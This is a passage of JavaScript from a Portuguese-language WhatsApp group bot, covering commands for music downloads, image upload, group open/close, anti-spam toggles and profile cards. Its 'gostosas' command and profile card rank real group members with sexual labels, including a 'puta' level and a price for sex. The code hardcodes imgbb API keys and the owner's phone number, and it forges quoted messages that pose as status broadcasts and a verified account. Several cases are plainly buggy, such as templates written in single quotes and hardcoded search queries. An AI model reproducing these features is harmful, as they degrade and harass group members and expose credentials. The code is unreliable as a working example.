let online = [...Object.keys(tomioka.chats.get(ido).presences), tomioka.user.jid]
tomioka.sendMessage(from, 'Lista de usuários online:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, {
quoted: msg,
contextInfo: {
mentionedJid: online
}
})
break
//_PASSAR IMAGEM PARA LINK 
case 'tourl':
if (!isPremium) return enviar ('só premium')

var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('espere')
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imurl = `${anu.display_url}`
enviar(imurl)
}
break
//_CHANCES MOSTRA PORCENTAGEM DO QUE ESPECIFICAR
case 'chance':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.updatePresence(from, Presence.composing) 
var avb = body.slice(7)
if (args.length < 1) return tomioka.sendMessage(from, `Você precisa digitar da forma correta\nExemplo: ${prefix}chance da vaca nao dar leite amanha`, text, {quoted: msg})
random = `${Math.floor(Math.random() * 100)}`
hasil = `A chance ${body.slice(7)}\n\né de... ${random}%`
tomioka.sendMessage(from, hasil, text, {quoted: msg, contextInfo: {mentionedJid: [sender]}})
break
//_FOTOS SHITPOST
case 'shiti':
case 'shit':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
data = fs.readFileSync('./src/shitii.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
randKey = jsonData[randIndex];
buffer = await getBuffer(randKey.result)
tomioka.sendMessage(from, buffer, image, {caption: 'aqui está:)', quoted: msg})
break
//_PLAQUINHAS
case 'pmake':

if (!isPremium) return enviar ('só premium')

if (args.length < 1) return enviar (mess.blank)
teks = body.slice(7)
if (teks.length > 15) return enviar ('O texto é longo, até 15 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ✓*')
buffer = await getBuffer(`https://ubbornag.sirv.com/Screenshot_20210513-151821.png?text.0.text=${teks}&text.0.position.x=-40%25&text.0.position.y=-65%25&text.0.size=30&text.0.color=000000&text.0.opacity=53&text.0.font.family=Shadows%20Into%20Light%20Two&text.0.outline.blur=15`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: 'Ta na mão 😈'})
break
case 'pmake2':
if (!isPremium) return enviar ('só premium')

if (args.length < 1) return enviar (mess.blank)
teks = body.slice(7)
if (teks.length > 10) return enviar ('O texto é longo, até 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ✓*')
buffer = await getBuffer(`https://ighteede.sirv.com/pack%20plaquinha%20%2B18%20BY%20sombrio/pack%20plaquinha%20%2B18%20BY%20sombrio/Screenshot_2021-04-10-22-59-23-1.png?text.0.text=${teks}&text.0.position.x=-36%25&text.0.position.y=-39%25&text.0.size=23&text.0.color=000000&text.0.opacity=54&text.0.font.family=Shadows%20Into%20Light`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: 'Toma ai 😈💅 '})
break
case 'anagrama':

if(!isGroup) return enviar('comando apenas para grupos')
const anaaleatorio = Math.floor(Math.random() * palavrasANA.length)
if(!isGroupAdmins) return enviar('comando apenas para admins')
if(args.length == 0) return enviar('use *anagrama ativar para ativar o jogo do anagrama\npara desativar user *anagrama desativar')
if (args.join(' ') === 'ativar') {
if(fs.existsSync(`./src/anagrama-${from}.json`)) {
let dataAnagrama2 = JSON.parse(fs.readFileSync(`./src/anagrama-${from}.json`))
enviar(`o jogo já foi iniciado neste grupo:
palavra: ${dataAnagrama2.embaralhada}
dica: ${dataAnagrama2.dica}
`)} else {
fs.writeFileSync(`./src/anagrama-${from}.json`, `${JSON.stringify(palavrasANA[anaaleatorio])}`)
tomioka.sendMessage(from, `
╭─────≽「 👾 ANAGRAMA 👾 」
│➽ DESCUBRA A PALAVRA
│➽ ANAGRAMA: ${palavrasANA[anaaleatorio].embaralhada}
│➽ DICA: ${palavrasANA[anaaleatorio].dica}
╰────────────────────────
`,MessageType.text)
}
} else if (args.join(' ') ==='desativar') {
if(!fs.existsSync(`./src/anagrama-${from}.json`)) return enviar('não tem como desativar o jogo do anagrama pôs ele não foi ativado')
fs.unlinkSync(`./src/anagrama-${from}.json`)
enviar("desativado com sucesso")
}
break
case 'gostosas':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
if (!isGroup) return enviar ('só grupo')
member = []
const p1 = groupMembers
const p2 = groupMembers
const p3 = groupMembers
const p4 = groupMembers
const p5 = groupMembers
const o1 = p1[Math.floor(Math.random() * p1.length)]
const o2 = p2[Math.floor(Math.random() * p2.length)]
const o3 = p3[Math.floor(Math.random() * p3.length)]
const o4 = p4[Math.floor(Math.random() * p4.length)]
const o5 = p5[Math.floor(Math.random() * p5.length)]
teks = `
Paradas!🤚🤚\n\n1=🤚🤭@${o1.jid.split('@')[0]}🤚🤭\n\n\n2=🤚🤭@${o2.jid.split('@')[0]}🤚🤭\n\n\n3=🤚🤭@${o3.jid.split('@')[0]}🤚🤭\n\n\n4=🤚🤭@${o4.jid.split('@')[0]}🤚🤭\n\n\n5=🤚🤭@${o5.jid.split('@')[0]}🤚🤭`
member.push(o1.jid)
member.push(o2.jid)
member.push(o3.jid)
member.push(o4.jid)
member.push(o5.jid)
mentions(teks, member, true)
break
case 'antiloc':

if (!isGroup) return enviar(`[??] SOMENTE EM GRUPOS`)
if (!isBotGroupAdmins) return enviar(`[📍] O BOT PRECISA SER ADMIN`)
try {														 
if (args.length < 1) return enviar('Hmmmm')
if (Number(args[0]) === 1) {
if (isAntiLoc) return enviar('Anti loc foi reativado')
antiloc.push(from)
fs.writeFileSync('./database/antiloc.json', JSON.stringify(antiloc))
enviar('Ativou com sucesso o recurso de anti loc neste grupo✔️')
} else if (Number(args[0]) === 0) {
antiloc.splice(from, 1)
fs.writeFileSync('./database/antiloc.json', JSON.stringify(antiloc))
enviar('Desativou com sucesso o recurso de anti loc neste grupo✔️')
} else {
enviar('1 para ativar, 0 para desativar')
}
} catch {
enviar('Deu erro, tente novamente :/')
}

break
case 'anticatalogo':
case 'catálogo':
case 'catalogo':
if (!isGroup) return enviar('só grupo')
if (!isGroupAdmins) return enviar('só adm')
if (!isBotGroupAdmins) return enviar('bot precisa ser adm')
if (args.length < 1) return enviar('Hmmmm')
if (Number(args[0]) === 1) {
if (isAntiCatalogo) return enviar('Já está ativo!')
anticatalogo.push(from)
fs.writeFileSync('./database/json/anticatalogo.json', JSON.stringify(anticatalogo))
enviar('aтινσυ cσм ѕυcєѕѕσ σ яєcυяѕσ αηтι-cαтάℓσgσ ηєѕтє gяυρσ ✔️')
} else if (Number(args[0]) === 0) {
let position = false
Object.keys(anticatalogo).forEach((i) => {
if (anticatalogo[i] === from) {
position = i
}
})
if (position !== false) {
anticatalogo.splice(position, 1)}
fs.writeFileSync('./database/json/anticatalogo.json', JSON.stringify(anticatalogo))
enviar('Ɗєѕαтινσυ cσм ѕυcєѕѕσ σ αηтι-cαтάℓσgσ ηєѕтє gяυρσ ✔️')
} else {
enviar('1🇦​🇹​🇮​🇻​🇦​ 0🇩​🇪​🇸​🇦​🇹​🇮​🇻​🇦​')
}
break
case 'antidoc':

if (!isGroup) return enviar(`[📍] SOMENTE EM GRUPOS`)
if (!isBotGroupAdmins) return enviar(`[📍] O BOT PRECISA SER ADMIN`)
try {														 
if (args.length < 1) return enviar('Hmmmm')
if (Number(args[0]) === 1) {
antidoc.push(from)
fs.writeFileSync('./database/antidoc.json', JSON.stringify(antidoc))
enviar('Ativou com sucesso o recurso de anti documento neste grupo✔️')
} else if (Number(args[0]) === 0) {
antidoc.splice(from, 1)
fs.writeFileSync('./database/antidoc.json', JSON.stringify(antidoc))
enviar('Desativou com sucesso o recurso de antidocumento neste grupo✔️')
} else {
enviar('1 para ativar, 0 para desativar')
}
} catch {
enviar('Deu erro, tente novamente :/')
}

break
case 'infobot':
temporlg = tomioka.prepareMessageFromContent(from,{
"listMessage": {
"title": "informações do bot",
"description": "Clique nos botões baixo e envie",
"buttonText": "clique aqui",
"listType": "SINGLE_SELECT",
"sections": [
{
"rows": [
{
"title": 'Velocidade do bot',
"rowId": `  ping`
},
{
"title": 'info bot e info do dispositivo',
"rowId": ` status`
}
]
}
]                    
}
}, {quoted:msg})
tomioka.relayWAMessage(temporlg)
break
case 'docu':
tope = fs.readFileSync('./assets/primeiro_teste.html')
tomioka.sendMessage(from, tope, MessageType.document, {mimetype: 'text/html', quoted: tomio, contextInfo: tome, filename: 'Tomioka.html'})
break
case 'anticontato':


if (!isBotGroupAdmins) return enviar(`[📍] O BOT PRECISA SER ADMIN`)
try {														 
if (args.length < 1) return enviar('Hmmmm')
if (Number(args[0]) === 1) {
anticontato.push(from)
fs.writeFileSync('./database/anticontato.json', JSON.stringify(anticontato))
enviar('Ativou com sucesso o recurso de anti contato neste grupo✔️')
} else if (Number(args[0]) === 0) {
anticontato.splice(from, 1)
fs.writeFileSync('./database/anticontato.json', JSON.stringify(anticontato))
enviar('Desativou com sucesso o recurso de anti contato neste grupo✔️')
} else {
enviar('1 para ativar, 0 para desativar')
}
} catch {
enviar('Deu erro, tente novamente :/')
}

break
case 'antispam':

if (!isGroup) return enviar(`[📍] SOMENTE EM GRUPOS`)
if (!isBotGroupAdmins) return enviar(`[📍] O BOT PRECISA SER ADMIN`)
if (args.length < 1) return enviar('SELECIONE 1/0')
if (args[0] === "1") {
if (AntiVirtex) return enviar('reativo sistema de anti trava(spam de txt)')
antivirtex.push(from)
fs.writeFileSync('./database/antivirtex.json', JSON.stringify(antivirtex))
enviar('_Sucesso em ligar antispam neste grupo_')
} else if (args[0] === "0") {
if (!AntiVirtex) return enviar('ja esta ativo')
let off = antivirtex.indexOf(from)
antivirtex.splice(off, 1)
fs.writeFileSync('./database/antivirtex.json', JSON.stringify(antivirtex))
enviar('_Sucesso na ativaçao de antispam_')
} else {
enviar('SELECIONE 1/0')
}
break

//_RANKS E %
case '%f':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.updatePresence(from, Presence.composing) 
var avb = body.slice(7)
random = `${Math.floor(Math.random() * 100)}`
hasil = `  ${body.slice(7)}\n\      ${random}% `
tomioka.sendMessage(from, hasil, text, {quoted: msg, contextInfo: {mentionedJid: [sender]}})
break
case '%b':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.updatePresence(from, Presence.composing) 
var avb = body.slice(7)
random = `${Math.floor(Math.random() * 100)}`
hasil = `  ${body.slice(7)}\n\      ${random}% `
tomioka.sendMessage(from, hasil, text, {quoted: msg, contextInfo: {mentionedJid: [sender]}})
break
//_COMANDOS ABRIR FECHAR GRUPO
case 'abrir':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.updatePresence(from, Presence.composing)
if (!isGroup) return enviar (ptbr.group())
if (!isGroupAdmins) return enviar (ptbr.admin())
if (!isBotGroupAdmins) return enviar (ptbr.Badmin())
open = {
text: `Grupo aberto por: @${sender.split("@")[0]}`,
contextInfo: {
mentionedJid: [sender]
}
}
tomioka.groupSettingChange (from, GroupSettingChange.messageSend, false)
tomioka.sendMessage(from, open, text, {
quoted: msg
})
break
case 'fechar':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.updatePresence(from, Presence.composing) 
if (!isGroup) return enviar ('só grupo')
if (!isGroupAdmins) return enviar ('só adm')
if (!isBotGroupAdmins) return enviar ('bot precisa ser adm')
var nomor = msg.participant
const close = {
text: `Grupo fechado pelo administrador @${nomor.split("@s.whatsapp.net")[0]}\nsekarang *apenas administrador* quem pode enviar mensagens`,
contextInfo: { mentionedJid: [nomor] }
}
tomioka.groupSettingChange (from, GroupSettingChange.messageSend, true);
enviar(close)
break
//GIF 
/*
case 'cumgif':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return enviar (ptbr.nsfw())
enviar(ptbr.waitsfw()) 
axios.get('https://nekos.life/api/v2/img/cum').then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
a = webp2gifFile(buf)
mp4 = getBuffer(a.result)
tomioka.sendMessage(from, mp4, MessageType.video, {mimetype: 'video/gif', filename: `stick.gif`, quoted: msg, caption: '✅'})
})
})
} catch (e) {
console.log(`Error :`, color(e,'red'))
enviar('❌ocorreu um erro❌\n\nTente novamente. ')
}
break*/
case 'tourl':
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo : msg
enviar('espere')
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("0c419be2e8bfc27eff00147b0c763418", owgi)
imurl = `${anu.display_url}`
enviar(imurl)
}
break
case 'cep':
if (args.length < 1) return enviar ('digite o cep que deseja buscar')
cep = body.slice(4)
hehe = await fetchJson(`https://brasilapi.com.br/api/cep/v1/${cep}`)
if (hehe.error) return enviar (hehe.error)
ccg =
` INFORMAÇÕES DO CEP
‣ Cep: ${hehe.cep}
‣ Estado: ${hehe.state}
‣ Cidade: ${hehe.city}`
tomioka.sendMessage(from, ccg, text, {quoted:msg})
break

/*case 'ddd':
if (args.length < 1) return enviar ('digite o ddd que deseja buscar')
ddd = body.slice(4)
hehe = await fetchJson(`https://brasilapi.com.br/api/ddd/v1/${ddd}`)
if (hehe.error) return enviar (hehe.error)
ccg =
` INFORMAÇÕES DO DDD
‣ Estado: ${hehe.state}
‣ Cidades: 
${hehe.cities}\n`
tomioka.sendMessage(from, ccg, text, {quoted:msg})
break*/
case 'convite':
if (args.length < 0) return enviar ('Digite o link do grupo ')
var codeInvite = body.slice(9).split('https://chat.whatsapp.com/')[1]
if (!codeInvite) return enviar ('certifique-se de que o link está correto! ')                 
if (args.length > 300) return tomioka.sendMessage(from, 'Máximo 300 caracteres', msgType.text, {quoted: msg})
var nomor = msg.participant
teks1 = `[CONVITE]\nDe: wa.me/${sender.split("@s.whatsapp.net")[0]}\nLink: ${body.slice(9)}`
var options = {
text: teks1, 
contextInfo: {mentionedJid: [sender]}, 
}
tomioka.sendMessage('554498220867@s.whatsapp.net', options, text, {quoted: msg})
enviar("O seu convite foi enviado ao meu dono e esta em analise; Spam = block + ban.")
break
case 'ddd':
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar ('BOT PRECISA DE ALGUM DDD DE UM NUMERO')
luc4rio1 = body.slice(5)
luc4rio2 = await fetchJson(`https://www.luc4rio-rest-api.tk/api/consultas/internacional?ddd=${luc4rio1}`, {method: 'get'})
if (luc4rio2.Erro) return enviar (luc4rio2.Erro)
luc4rio3 = 
` BEM VINDO AO MENU DE CONSULTA\n\n〘 INFORMAÇÕES 〙
⧴ 〘 CIDADES 〙 : ${luc4rio2.Cidades}
⧴ 〘 ESTADO 〙 : ${luc4rio2.Estado}
〘 ${luc4rio2.Mensagem} 〙\n\nNÃO E POSSÍVEL PUXA CONSULTA DE TELEFONE\n\nBY : TioTomioka`
tomioka.sendMessage(from, luc4rio3, text, {quoted: msg})
break

case 'info':
case 'infome':
case 'perfil':
case 'eu':
try {
         var ppimg = await tomioka.getProfilePicture(`${sender.split('@')[0]}@c.us`)
            } catch {
               var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
            }
var palavras = ["Se você traçar metas absurdamente altas e falhar, seu fracasso será muito melhor que o sucesso de todos. – James Cameron, Cineastra", "O sucesso normalmente vem para quem está ocupado demais para procurar por ele – Henry David Thoreau, filósofo", "A vida é melhor para aqueles que fazem o possível para ter o melhor – John Wooden, jogador e treinador de basquete", "Os empreendedores falham, em média, 3,8 vezes antes do sucesso final. O que separa os bem-sucedidos dos outros é a persistência – Lisa M. Amos, executiva", "Se você não está disposto a arriscar, esteja disposto a uma vida comum – Jim Rohn, empreendedor", "Escolha uma ideia. Faça dessa ideia a sua vida. Pense nela, sonhe com ela, viva pensando nela. Deixe cérebro, músculos, nervos, todas as partes do seu corpo serem preenchidas com essa ideia. Esse é o caminho para o sucesso – Swami Vivekananda, pensador hindu", "Para de perseguir o dinheiro e comece a perseguir o sucesso – Tony Hsieh, empreendedor", "Todos os seus sonhos podem se tornar realidade se você tem coragem para persegui-los – Walt Disney, desenhista e empreendedor", "*Ter sucesso é falhar repetidamente, mas sem perder o entusiasmo – Winston Churchill, político", "Sempre que você vir uma pessoa de sucesso, você sempre verá as glórias, nunca os sacrifícios que os levaram até ali – Vaibhav Shah, pensador", "Sucesso? Eu não sei o que isso significa. Eu sou feliz. A definição de sucesso varia de pessoa para pessoa Para mim, sucesso é paz anterior – Denzel Washington, ator", "Oportunidades não surgem. É você que as cria – Chris Grosser, fotógrafo", "Não tente ser uma pessoa de sucesso. Em vez disso, seja uma pessoa de valor – Albert Einstein, físico", "Não é o mais forte que sobrevive, nem o mais inteligente. Quem sobrevive é o mais disposto à mudança – Charles Darwin, biólogo", "A melhor vingança é um sucesso estrondoso – Frank Sinatra, cantor", "Eu não falhei. Só descobri 10 mil caminhos que não eram o certo – Thomas Edison, inventor", "Um homem de sucesso é aquele que cria uma parede com os tijolos que jogaram nele – David Brinkley, jornalista", "Ninguém pode fazer você se sentir inferior sem o seu consentimento – Eleanor Roosevelt, primeira-dama dos EUA", "*O grande segredo de uma boa vida é encontrar qual é o seu destino. E realizá-lo – Henry Ford, empreendedor", "Se você está atravessando um inferno, continue atravessando – Churchill", "O que nos parece uma provação amarga pode ser uma bênção disfarçada – Oscar Wilde, escritor", "A distância entre a insanidade e a genialidade é medida pelo sucesso – Bruce Feirstein, roteirista", "Não tenha medo de desistir do bom para perseguir o ótimo – John D. Rockefeller, empreendedor", "Não tenha medo de desistir do bom para perseguir o ótimo – John D. Rockefeller, empreendedor", "A felicidade é uma borboleta que, sempre que perseguida, parecerá inatingível; no entanto, se você for paciente, ela pode pousar no seu ombro – Nathaniel Hawthorne, escritor", "Se você não pode explicar algo de forma simples, então você não entendeu muito bem o que tem a dizer – Einstein", "Há dois tipos de pessoa que vão te dizer que você não pode fazer a diferença neste mundo: as que têm medo de tentar e as que têm medo de que você se dê bem – Ray Goforth, executivo", "Comece de onde você está. Use o que você tiver. Faça o que você puder – Arthur Ashe, tenista","As pessoas me perguntam qual é o papel que mais gostei de interpretar. Eu sempre respondo: o próximo – Kevin Kline, ator","Descobri que, quanto mais eu trabalho, mais sorte eu pareço ter – Thomas Jefferson, político","O ponto de partida de qualquer conquista é o desejo – Napoleon Hill, assessor político"]
var conselho = palavras[Math.floor(Math.random() * palavras.length)]
const nivelgado = ['1','2','3','4','5','6','7','8','9']
const nivelgado2 = ['1','2','3','4','5','6','7','8','9'] 
const nivelgador = nivelgado[Math.floor(Math.random() * (nivelgado.length))]
const nivelgado2r = nivelgado2[Math.floor(Math.random() * (nivelgado2.length))] 
const puta = ['1','2','3','4','5','6','7','8','9']
const puta2 = ['1','2','3','4','5','6','7','8','9'] 
const putar = puta[Math.floor(Math.random() * (puta.length))]
const putar2 = puta2[Math.floor(Math.random() * (puta2.length))] 
const gostosura = ['1','2','3','4','5','6','7','8','9']
const gostosura2 = ['1','2','3','4','5','6','7','8','9'] 
const gostosurar = gostosura[Math.floor(Math.random() * (gostosura.length))]
const gostosurar2 = gostosura2[Math.floor(Math.random() * (gostosura2.length))] 
gadop = `${Math.floor(Math.random() * 100)}`
const programa = Math.ceil(Math.random() * 10000)
const proximolvlxp = 5000 * (Math.pow(2, getLevelingLevel(sender)) - 1)
buffer = await getBuffer(ppimg)
hisil = `
     「🔥PERFIL 🔥 」
🗒 Nome : ${pushname}
✍️Comandos usados : ${countMessage[ind].numbers[indnum].cmd_messages}
👀 Mensagens Enviadas : ${countMessage[ind].numbers[indnum].messages}
🪀 Número : wa.me/${sender.split('@')[0]}
🕹 Xp : ${getLevelingXp(sender)}/${proximolvlxp}
📊 Nível : ${getLevelingLevel(sender)}
🛡 Patente : ${patt}
⏳ Tempo  : ${time}
🐂 Nível gado : ${nivelgador}${nivelgado2r}%
😈 Nível puta : ${putar}${putar2}%
😋 Nível de gostosura : ${gostosurar}${gostosurar2}%
🍼 Valor do programa : R$${programa}

➻ CONSELHO :
${conselho}
`
tomioka.sendMessage(from, buffer, image, {caption: hisil,quoted: tomio, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
break
case 'traduzir': //@SUPRA â™¡
if (args.length < 1) return enviar ('Insira o texto que vocÃª deseja traduzir')
tomioka.updatePresence(from, Presence.composing)
tels = body.slice(10)
try {
anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/translate?text=${tels}&from=id&to=pt`, {
method: 'get'
})
enviar('traduzido')
} catch {
enviar(mess.ferr)
}
break
case 'simbolos':

enviar (',ツ,ッ,シ,ツ,囧,〠,㋡,㋞,ツ,༺༻,☬,Ӂ,༒,࿐,៚,༆,乡,⎝⎝⎠⎠,░,⫷⫸,෴,⚔,⚒')
break
//_CASES PLAY MUSICA 
case 'play':   

if (args.length < 1) return enviar (`Exemplo : ${p}play Paypal`)	
apykeybysayo = 'Skillerofc'  //CONSIGA SUA KEY NESSE SITE = https://api.zeks.xyz/api
enviar("espere....\nse nao enviou em ate 2 min é porque comando caiu\n\n nao floode o chat enquanto ele procura ") 				 
anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp3?apikey=${apykeybysayo}&q=${body.slice(5)}`)
if (anu.error) return enviar (anu.error)
infomp3 = `𝐂𝐨𝐧??𝐚 ??𝐞𝐫𝐢𝐟𝐢𝐜𝐚𝐝𝐚\n❗MUSÍCA ENCONTRADA\n[❗] enviando sua música aguarde..`				
buffer = await getBuffer(`https://api-exteam.herokuapp.com/api/card-spotify?titulo=${encodeURIComponent(anu.result.title)}&author=${encodeURIComponent(anu.result.source)}&album=TOMIOKA-BOT&capa=${anu.result.thumbnail}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": infomp3, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})					
msc = await getBuffer(anu.result.url_audio)				
tomioka.sendMessage(from, msc, audio, {mimetype: 'audio/mp4', filename: `tomioka-bot.mp3`, contextInfo: null, quoted: tomio, contextInfo: tome})
break
case 'play1':
enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
teks = body.slice(6)
musica = await fetchJson(`https://api.zeks.xyz/api/ytplaymp3?q=${play}&apikey=apivinz`)
buffer1 = await getBuffer(musica.result.thumb)
buffer2 = await getBuffer(musica.result.dl_link)
teks =`𝚈𝚘??𝚝𝚞𝚋𝚎 𝙿𝚕𝚊𝚢 𝙼𝚞𝚜𝚒𝚌
𝚄𝚜𝚞𝚊́𝚛𝚒𝚘 @${sender.split("@")[0]}
𝚝𝚒𝚝𝚞𝚕𝚘 ${musica.result.title}`
tomioka.sendMessage(from, buffer1, image, {quoted: msg, caption: teks })
tomioka.sendMessage(from, buffer2, MessageType.audio, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "꧁𝕋𝕆𝕄𝕀𝕆𝕂??~𝔹𝕆𝕋꧂", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('./assets/botlogo.webp')} } }, caption: "<//>" })
break
case 'play2':

if (args.length < 1) return enviar ('Digite o nome da música')
enviar('Procurando sua musica..')
anu = await fetchJson(`http://kratosdevofc-api.herokuapp.com/downloads/ytmp3&titulo=${teks}&apikey=tiotomioka`)
if (anu.error) return enviar (anu.error)
//       ingfomp3 = `*Musica encontrada*\n Titulo : ${anu.title}\nCanal: ${anu.channel}\nPublicado: ${anu.published}\nViews: ${anu.views}\n\n*Enviando audio🎶*`
msg = ('Musica encontrada enviando...\nFonte:YouTube ')
buffer = await getBuffer(anu.thumb)
lagu = await getBuffer(anu.url)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: msg})
tomioka.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', ptt:true})
break
case 'play3':
if (args.length < 1) return enviar ('Digite o nome da música')
play = body.slice(6)
enviar('Procurando sua música...⏳')
anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp4?apikey=tiotomioka&q=jatuh%20jadi%20resah`)
if (anu.message) return enviar ('Música não encontrada...\nTente específicar o nome dela.')
//aanu = await fetchJson(`https://api-tomioka.italuh.repl.co/api/yta?url=${anu.result.source}`)
aanu = await fetchJson(`https://api-exteam.herokuapp.com/api/yt/playmp3?query=${play}&apikey=estreia`)
infomp3 = 
`    MÚSICA ENCONTRADA
‣ Título: ${anu.result.title}
‣ Fonte: ${anu.result.source}`
buffer = await getBuffer(anu.result.thumbnail)
//lagu = await getBuffer(anu.result.url_audio)
lagu = await getBuffer(aanu.url)
setTimeout( () => {
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: infomp3})
}, 1500)
enviar('Baixando e enviando sua música...')
tomioka.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', quoted: msg})
break
case 'play4':
if (args.length < 1) return enviar ('Digite o link da música')
enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
play = body.slice (6)
anu = await fetchJson(`https://enolaholmes.herokuapp.com/api/yutub/audio?url=${play}&apikey=Alphabot`)
//Info = 'Musica\ntitulo ${anu.result.title}\ntamanho ${anu.result.filesize}'
info2 = 'MUSICA ENCONTRADA!!!\nFonte:YouTube\nJa estou te enviando sua musica...'
buffer = await getBuffer(anu.result.thumb)
lagu = await getBuffer(anu.result.result)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: info2})
tomioka.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', filename: `${anu.result.title}.mp3`, quoted: msg})

break
case 'play5':
enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
anu = await fetchJson('https://luc4rio.herokuapp.com/api/social/play/audio?video=${body.slice(6)}')
Info = '${anu.Mensagem}\nTitulo ${anu.Titulo_Encontrado} Duração ${anu.Duracao_Do_Video}Fonte ${Link_Do_Video}'
buffer = await getBuffer(anu.Imagem_Do_Video)
lagu = await getBuffer(anu.Link_De_Download)
tomioka.sendMessage(from, buffer, image, {quoted: msg,caption:info})
tomioka.sendMessage(from, lagu, audio, {mimetype:'audio/mp4',filename: '${anu.Titulo_Encontrado}.mp3' , quoted: msg})
break
case  'play6':
teks = body.slice(5)
krat4ss = await fetchJson (`https://api.zeks.xyz/api/ytplaymp4?apikey=apivinz&q=jatuh%20jadi%20resah`)
kratos = await getBuffer(krat4ss.resultado.audio)
enviar('Enviando Aguarde')
tomioka.sendMessage(from, kratos, audio, {quoted: msg})
break
//playe tomiokaa
case 'playe':   
if (!isPremium) return enviar ('só premium')

if (args.length < 1) return enviar (`Exemplo : ${prefix}play Paypal`)	
apykeybyTomioka = 'TioTomioka'  //CONSIGA SUA KEY NESSE SITE = https://api.zeks.xyz/api
enviar("espere....\nse nao enviou em ate 2 min é porque comando caiu\n\n nao floode o chat enquanto ele procura ") 				 
anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp3?apikey=${apykeybyTomioka}&q=${body.slice(5)}`)
if (anu.error) return enviar (anu.error)
infomp3 = `𝐂𝐨𝐧𝐭𝐚 𝐕𝐞𝐫𝐢𝐟𝐢𝐜𝐚????\n❗MUSÍCA ENCONTRADA\n[❗] enviando sua música aguarde..`				
buffer = await getBuffer(`https://api-exteam.herokuapp.com/api/card-spotify?titulo=${encodeURIComponent(anu.result.title)}&author=${encodeURIComponent(anu.result.source)}&album=TOMIOKA-BOT&capa=${anu.result.thumbnail}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": infomp3, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})					
msc = await getBuffer(anu.result.url_audio)				
tomioka.sendMessage(from, msc, audio, {mimetype: 'audio/mp4', filename: `tomioka-bot.mp3`, contextInfo: null, quoted: tomio, contextInfo: tome})
break
case 'dado2':
if (!isPremium) return enviar ('só premium')
